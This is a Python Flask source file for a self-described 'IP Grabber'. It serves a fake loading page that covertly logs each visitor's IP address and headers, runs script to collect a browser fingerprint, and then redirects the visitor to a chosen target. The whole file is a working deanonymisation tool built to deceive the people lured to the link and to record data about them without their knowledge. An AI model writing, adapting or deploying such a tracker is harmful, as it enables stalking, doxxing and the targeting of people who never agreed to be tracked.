from flask import Flask, request, render_template_string, redirect
import datetime
import json
import os
import socket

app = Flask(__name__)

# HTML template for the fake page
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            background-color: #f5f5f5;
        }
        .loading {
            font-size: 24px;
            color: #333;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading">Loading content...</div>
    <div class="spinner"></div>
    <p>Please wait while we redirect you...</p>
    
    <script>
        // Collect browser information
        function gatherInfo() {
            var info = {
                'user_agent': navigator.userAgent,
                'screen_resolution': screen.width + 'x' + screen.height,
                'color_depth': screen.colorDepth,
                'timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
                'language': navigator.language,
                'languages': navigator.languages,
                'platform': navigator.platform,
                'cookie_enabled': navigator.cookieEnabled,
                'online': navigator.onLine,
                'referrer': document.referrer,
                'url': window.location.href
            };
            
            // Send info to server
            fetch('/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            }).catch(function(error) {
                console.log('Info collection failed:', error);
            });
        }
        
        // Execute immediately
        gatherInfo();
        
        // Redirect after 3 seconds
        setTimeout(function() {
            window.location.href = "{{ redirect_url }}";
        }, 3000);
    </script>
</body>
</html>
'''

def get_local_ip():
    """Get the local IP address"""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except:
        return "127.0.0.1"

def log_to_file(data, filename):
    """Helper function to log data to file"""
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, indent=2) + '\n' + '-'*50 + '\n')
        return True
    except Exception as e:
        print(f"Error writing to file: {e}")
        return False

@app.route('/')
def main_page():
    """Main route that captures initial visit"""
    
    # Get client IP (handle proxies/load balancers)
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR')
    if client_ip:
        client_ip = client_ip.split(',')[0].strip()
    else:
        client_ip = request.remote_addr
    
    # Collect initial data
    visit_data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'ip_address': client_ip,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
        'accept_encoding': request.headers.get('Accept-Encoding', 'Unknown'),
        'referer': request.headers.get('Referer', 'Direct Visit'),
        'host': request.headers.get('Host', 'Unknown'),
        'connection': request.headers.get('Connection', 'Unknown'),
        'all_headers': dict(request.headers)
    }
    
    # Log the visit
    log_to_file(visit_data, 'ip_logs.txt')
    
    # Print to console for real-time monitoring
    print(f"\n[VISIT CAPTURED] {visit_data['timestamp']}")
    print(f"IP: {client_ip}")
    print(f"User Agent: {visit_data['user_agent'][:80]}...")
    print(f"Referer: {visit_data['referer']}")
    print("-" * 50)
    
    # Set redirect URL (change this to your target)
    redirect_url = "https://www.google.com"
    
    return render_template_string(HTML_TEMPLATE, redirect_url=redirect_url)

@app.route('/collect', methods=['POST'])
def collect_info():
    """Route to collect additional browser information"""
    
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR')
    if client_ip:
        client_ip = client_ip.split(',')[0].strip()
    else:
        client_ip = request.remote_addr
    
    try:
        browser_info = request.get_json()
        
        detailed_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'ip_address': client_ip,
            'browser_fingerprint': browser_info
        }
        
        # Log detailed information
        log_to_file(detailed_data, 'detailed_logs.txt')
        
        print(f"[DETAILED INFO] IP: {client_ip}")
        print(f"Screen: {browser_info.get('screen_resolution', 'Unknown')}")
        print(f"Platform: {browser_info.get('platform', 'Unknown')}")
        print(f"Language: {browser_info.get('language', 'Unknown')}")
        
        return 'OK', 200
    except Exception as e:
        print(f"Error collecting detailed info: {e}")
        return 'Error', 500

@app.route('/status')
def status():
    """Status page to check if server is running"""
    return {
        'status': 'running',
        'timestamp': datetime.datetime.now().isoformat(),
        'message': 'IP Grabber is active'
    }

if __name__ == '__main__':
    local_ip = get_local_ip()
    
    print("="*60)
    print("IP GRABBER SERVER STARTING")
    print("="*60)
    print("Server will be available at:")
    print(f"- Local: http://127.0.0.1:8080")
    print(f"- Network: http://{local_ip}:8080")
    print("\nLogs will be saved to:")
    print("- ip_logs.txt (basic visit info)")
    print("- detailed_logs.txt (browser fingerprints)")
    print("\nPress Ctrl+C to stop the server")
    print("="*60)
    
    app.run(host='0.0.0.0', port=8080, debug=True)
